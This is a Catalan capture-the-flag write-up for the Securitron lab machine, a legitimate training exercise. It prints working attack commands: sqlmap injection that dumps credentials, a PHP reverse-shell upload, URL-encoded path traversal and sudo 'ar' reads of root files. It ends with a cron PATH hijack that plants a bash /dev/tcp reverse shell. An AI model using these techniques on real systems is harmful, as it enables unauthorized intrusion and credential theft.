---
author: Lenam  
pubDatetime: 2024-08-23T15:22:00Z  
title: WriteUp Securitron - TheHackersLabs  
slug: securitron-writeup-thehackerslabs-ca
featured: false  
draft: false  
ogImage: "assets/securitron/OpenGraph.png"  
tags:
  - writeup
  - TheHackersLabs
  - AI
  - SQL Injection
  - sudo
  - binary planting
description:  
  El meu primer CTF creat per a la plataforma thehackerslabs.com i amb un model d'IA, espero que sigui del vostre grat.  
lang: ca  
---

El meu primer CTF creat per a la plataforma thehackerslabs.com i amb un model d'IA, espero que sigui del vostre grat.

![Securitron](/assets/securitron/image-39.png)

Pot haver-hi lleugeres variacions de la màquina que trobaràs a The Hacker Labs, ja que vaig haver de corregir alguns problemes. Gràcies a CuriosidadesDeHackers per la seva ajuda i a murrusko per pujar el writeup.

## Taula de continguts

## Enumeració

```
nmap -p- 10.0.2.4 -n -Pn
```

![Nmap](/assets/securitron/image-5.png)

Només trobem el port 80 obert, analitzem amb més detall el port 80.

```
nmap -p80 -sVC -n -Pn 10.0.2.4 -oN nmap.txt -vvv
```

![Nmap](/assets/securitron/image-6.png)

Visitem el web i observem un servei d'IA de ciberseguretat.

![web](/assets/securitron/image-7.png)

Afegim el domini `securitron.thl` al fitxer `/etc/hosts`.

![/etc/hosts](/assets/securitron/image-8.png)

```
whatweb http://securitron.thl
```

## Filtració IA

Parlem amb la IA, sembla una mica lenta a respondre, però ens explica que és un expert en ciberseguretat.

Prompt:
```
Hola en que puedes ayudarme?
```

![IA](/assets/securitron/image-9.png)

Li proposem que faci algun tipus de programació i es filtra un possible subdomini anomenat `admin19-32.securitron.thl` i una possible API-key `imagine-no-heaven-no-countries-no-possessions`.

Prompt:
```
Puedes hacer una programación para conectar a una API?
```

![Filtració IA](/assets/securitron/image-10.png)

Afegim el subdomini `admin19-32.securitron.thl` al fitxer `/etc/hosts`.

![/etc/hosts](/assets/securitron/image-11.png)

## SQL Injection

Accedim al subdomini `admin19-32.securitron.thl` i ens apareix l'aplicació "Employee Management System".

![Employee Management System](/assets/securitron/image-12.png)

```
whatweb http://admin19-32.securitron.thl
```

![whatweb](/assets/securitron/image-13.png)

Trobem diversos exploits que s'aprofiten d'un SQL Injection en el formulari `http://admin19-32.securitron.thl/Admin/login.php`.

```
searchsploit "Employee Management System"
```

![searchsploit](/assets/securitron/image-14.png)

Obrim Burp Suite, configurem el proxy del navegador i capturem l'enviament d'una petició del formulari de login.

```
POST /Admin/login.php HTTP/1.1
Host: admin19-32.securitron.thl
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Origin: http://admin19-32.securitron.thl
Connection: close
Referer: http://admin19-32.securitron.thl/Admin/login.php
Cookie: PHPSESSID=6gr7532dnv7ni64ckglf9ne00l
Upgrade-Insecure-Requests: 1

txtusername=test&txtpassword=test&btnlogin=
```

![request.txt](/assets/securitron/image-15.png)

Guardem la petició en un fitxer `request.txt`, per utilitzar-la mitjançant sqlmap.

```
sqlmap -r request.txt --level 5 --risk 3 --current-db
```

![sqlmap current-db](/assets/securitron/image-16.png)

Obtenim les taules de la base de dades `pms_db`:

```
sqlmap -r request.txt --level 5 --risk 3 -D pms_db --tables
```

![sqlmap tables](/assets/securitron/image-17.png)

Obtenim les dades de la taula `users` de la base de dades `pms_db`, la contrasenya sembla estar sense hashear, ¡bingo!

```
sqlmap -r request.txt --level 5 --risk 3 -D pms_db -T users --dump
```

![sqlmap table users](/assets/securitron/image-18.png)

## LFI / Shell

Entrem a l'aplicació des del formulari `http://admin19-32.securitron.thl/Admin/login.php` amb l'usuari `admin:Ntpqc6Z7MDkG`.

![Employee Management System Admin](/assets/securitron/image-19.png)

Preparem un revshell en PHP, utilitzo el de `PHP PentestMonkey` ja que estem davant d'una aplicació en PHP, configurant la nostra IP (`10.0.2.15`) i el port desitjat (`9001`), i creem un fitxer amb el nom `avatar.php.png`.

![PHP PentestMonkey revshell](/assets/securitron/image-20.png)

Ens dirigim a l'apartat "User Management" > "Add User". Obrim Burp Suite, activem el intercept i configurem el proxy del navegador, omplim els camps per crear un nou usuari i seleccionem el nostre revshell creat anteriorment `avatar.php.png` com a imatge per a l'avatar.

![Burpsuite](/assets/securitron/image-21.png)

Modifiquem el filename de `avatar.php.png` a `avatar.php` a Burp Suite i enviem la petició `Forward`.

![Burpsuite 2](/assets/securitron/image-22.png)

Ens apareixerà un missatge indicant que l'usuari s'ha afegit correctament, ara ja podem desactivar el proxy de Burp Suite del navegador.

Si anem al llistat d'usuaris User `Management > Admin Record` i inspeccionem el codi, podrem trobar l'adreça on s'ha pujat el `avatar.php` on es troba la nostra revshell.

![URL revshell](/assets/securitron/image-23.png)

Ens posem a escoltar amb netcat...

```bash
nc -lvnp 9001
```

i carreguem la següent adreça amb curl o el navegador.

```bash
curl http://admin19-32.securitron.thl/uploadImage/Profile/avatar.php
```

![revshell](/assets/securitron/image-24.png)

¡Bé, ja som dins!

## Moviment lateral

Tractem el tty i intentem elevar privilegis.

Tenim els usuaris `root` i `securitybot`.

```bash
cat /etc/passwd | grep bash
```

![users](/assets/securitron/image-25.png)

Mirem els ports TCP que trobem a la màquina.

```
ss -tuln | grep tcp
```

![alt text](/assets/securitron/image-26.png)

El port `80` és el del servei web que hem explotat, el port 3306 és el de la BD que també ja hem explotat.

El port `3000` no el coneixem, l'investiguem.

El port `3000`, en mirar el fitxer `/etc/apache2/sites-available/000-default.conf`, podem intuir que és l'API que exposa la IA utilitzada al principi, ja que té un proxy configurat que apunta a l'endpoint d'aquest port.

![virtualhost 000-default.conf](/assets/securitron/image-27.png)

L'investiguem una mica més i observem que hi ha un procés que corre pel usuari `securitybot`, que sembla de Node.js.

```
ps -aux | grep securitybot
```

![alt text](/assets/securitron/image-28.png)

No tenim permisos per veure el fitxer `/home/securitybot/.local/bin/bot/index.js`, però sí que podem executar Node

.js mitjançant la ruta `/home/securitybot/.nvm/versions/node/v22.5.1/bin/node`.

Mirem què podem trobar al port 3000. L'endpoint /api ens dóna informació en JSON sobre l'API. Utilitzem `curl` i `node` per mostrar aquesta informació de manera llegible.

```bash
curl http://localhost:3000/api | /home/securitybot/.nvm/versions/node/v22.5.1/bin/node -p "JSON.stringify( JSON.parse(require('fs').readFileSync(0) ), 0, 1 )"
```

![API information](/assets/securitron/image-29.png)

Per facilitar la visualització del JSON obtingut per l'API, creem un alias.

```bash
alias showJson="/home/securitybot/.nvm/versions/node/v22.5.1/bin/node -p \"JSON.stringify( JSON.parse(require('fs').readFileSync(0) ), 0, 1 )\""
```

Mirem si podem accedir a l'endpoint /api/models.

```bash
curl http://localhost:3000/api/models | showJson
```

Ens apareix un missatge d'error que diu `API Key és requerida`, en la descripció de l'endpoint mostrava el text `requereix x-api-key header`.

Provem amb l'API-KEY filtrada al principi en la IA `imagine-no-heaven-no-countries-no-possessions`, i la introduïm com a valor de la capçalera `x-api-key`.

```bash
curl -H "x-api-key: imagine-no-heaven-no-countries-no-possessions" http://localhost:3000/api/models | showJson
```

Sembla que funciona amb l'API-KEY filtrada, ara ens retorna un llistat de dos fitxers de models IA en format GGUF. Provem amb l'endpoint `/api/models/:fileName`, indicant el segon fitxer de model `ggml-model-q4_0.gguf`, i el descarrega correctament.

```bash
curl -H "x-api-key: imagine-no-heaven-no-countries-no-possessions" http://localhost:3000/api/models/ggml-model-q4_0.gguf -o /tmp/model.gguf
```

L'esborrem o cancel·lem la descàrrega ja que ocupa molt espai.

Intentem llegir algun fitxer que sabem que existeix i que només pot llegir l'usuari `securitybot`, com per exemple `/home/securitybot/.local/bin/bot/index.js`, que sabem que existeix però no tenim accés de lectura amb el nostre usuari.

```bash
curl -H "x-api-key: imagine-no-heaven-no-countries-no-possessions" http://localhost:3000/api/models/..%2F..%2F..%2F..%2F..%2F..%2Fhome%2Fsecuritybot%2F.local%2Fbin%2Fbot%2Findex.js
```

Podem llegir el fitxer correctament de la programació de l'API en Node.js.

Intentem llegir el fitxer de la flag de user.txt de l'usuari `securitybot`.

```bash
curl -H "x-api-key: imagine-no-heaven-no-countries-no-possessions" http://localhost:3000/api/models/..%2F..%2F..%2F..%2F..%2F..%2Fhome%2Fsecuritybot%2Fuser.txt
```

Obtenim la flag de user.txt i una contrasenya de regal `0KjcFEkuUEXG` (això no és molt realista).

![User flag and password](/assets/securitron/image-30.png)

Accedim a l'usuari `securitybot` amb la contrasenya `0KjcFEkuUEXG`.

![securitybot](/assets/securitron/image-31.png)

## Elevació de privilegis

Comprovem si tenim algun permís sudo, ja que tenim la contrasenya de l'usuari.

![sudo](/assets/securitron/image-32.png)

Tenim permís sudo per executar el binari `ar`, segons el que indica a GTFOBins, podem obtenir una lectura de fitxers privilegiada.

![gtfobins](/assets/securitron/image-33.png)

Intentem llegir la flag de root.txt mitjançant `sudo` en el binari `ar`.

```bash
TF=$(mktemp -u) && sudo /usr/bin/ar r "$TF" "/root/root.txt" && cat "$TF"
```

En llegir el fitxer de la flag de `/root/root.txt`, ens apareix el missatge `Aquesta vegada no serà tan fàcil.`

![/root/root.txt](/assets/securitron/image-34.png)

Intentem llegir altres fitxers i trobem alguna cosa molt interessant en el fitxer de crontab de l'usuari root.

```bash
TF=$(mktemp -u) && sudo /usr/bin/ar r "$TF" "/var/spool/cron/crontabs/root" && cat "$TF"
```

![/var/spool/cron/crontabs/root](/assets/securitron/image-35.png)

En el PATH del crontab de root hi ha una carpeta en la qual tenim permisos d'escriptura `/home/securitybot/.local/bin` i l'usuari root està executant un script en bash cada minut `/opt/backup_bd.sh`.

```bash
cat /opt/backup_bd.sh
```

```bash
# Verificar si es va passar un argument (la data)
if [ -z "$1" ]; then
  echo "Ús: $0 <data>"
  exit 1
fi

# Variables
DATA=$1
USUARI="matomo"
CONTRASENYA="7pUYlPYpziv1"
BASE_DADES="pms_db"
CARPETA_BACKUP="/root/backups"
NOM_BACKUP="${CARPETA_BACKUP}/backup_${BASE_DADES}_${DATA}.sql"

# Crear carpeta de backups si no existeix
/bin/mkdir -p $CARPETA_BACKUP

# Crear backup
/usr/bin/mysqldump -u $USUARI -p$CONTRASENYA $BASE_DADES > $NOM_BACKUP

# Verificar si el backup es va crear correctament
if [ $? -eq 0 ]; then
  echo "Backup creat correctament: $NOM_BACKUP"
else
  echo "Error en crear el backup"
  exit 1
fi

# Mantenir només els dos últims backups
/bin/ls -t $CARPETA_BACKUP | /usr/bin/sed -e '1,2d' | /usr/bin/xargs -d '\n' /bin/rm -f
```

Sembla que el fitxer crea un backup de la BD en una carpeta a la qual no tenim permisos. 

Tots els binaris que s'utilitzen dins del fitxer `backup_bd.sh` i el propi fitxer són cridats amb paths absoluts, impedint una suplantació de binari amb ells. En canvi, el paràmetre enviat al fitxer utilitza el binari `date` sense una adreça absoluta.

![date no absolute](/assets/securitron/image-36.png)

Si comprovem on es troba el fitxer `date`, es troba a `/usr/bin/date`,

![alt text](/assets/securitron/image-37.png)

i com el PATH del crontab de root està configurat de la següent forma:

`PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/home/securitybot/.local/bin:/usr/bin:/sbin:/bin`

podem crear un fitxer `date` a la carpeta `/home/securitybot/.local/bin` que es troba abans que la carpeta `/usr/bin`, fent que la tasca programada de l'usuari root executi el nostre fitxer suplantat.

Ens posem a escoltar amb netcat al port 12345.

```bash
nc -lvnp 12345
```

Creem el fitxer `/home/securitybot/.local/bin/date` al servidor amb una revshell i li donem permisos d'execució:

```bash
echo "bash -c '/bin/bash -i >& /dev/tcp/10.0.2.15/12345 0>&1'" > /home/securitybot/.local/bin/date
chmod +x /home/securitybot/.local/bin/date
```

Esperem un minut i obtenim una shell amb privilegis de l'usuari root i llegim el fitxer de la flag.

![root flag](/assets/securitron/image-38.png)

Felicitat, ja has completat el CTF Securitron.